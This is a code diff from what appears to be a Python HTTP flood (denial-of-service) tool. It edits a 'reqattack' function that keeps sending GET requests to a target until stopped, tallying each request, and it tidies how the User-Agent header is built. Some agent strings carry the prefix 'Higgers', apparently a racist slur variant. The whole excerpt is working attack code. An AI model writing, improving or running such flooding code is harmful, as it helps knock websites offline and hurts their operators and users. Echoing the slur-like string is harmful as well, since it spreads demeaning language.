@@ -76,22 +76,20 @@ print()
 
 def reqattack(target, stop_event):
     while not stop_event.is_set():
+        useragent = ""
         if settings.userset_useragent:
-            header = {
-                "User-Agent": "Higgers " + settings.useragent
-            }
+            useragent = settings.useragent
         elif settings.uarand == "words":
-            header = {
-                "User-Agent": "Higgers " + random.choice(settings.wordlist)
-            }
+            useragent ="Higgers " + random.choice(settings.wordlist)
         elif settings.uarand == "num":
-            header = {
-                "User-Agent": "Higgers " + str(random.randrange(11111, 99999))
-            }
+            useragent = "Higgers " + str(random.randrange(11111, 99999))
         else:
-            header = {
-                "User-Agent": "Higgers " + random.choice(settings.wordlist)
-            }
+            useragent = "Higgers " + random.choice(settings.wordlist)
+            
+        header = {
+            "User-Agent": useragent
+        }
+
         requests.get(target, headers=header)
         settings.reqmade += 1
 
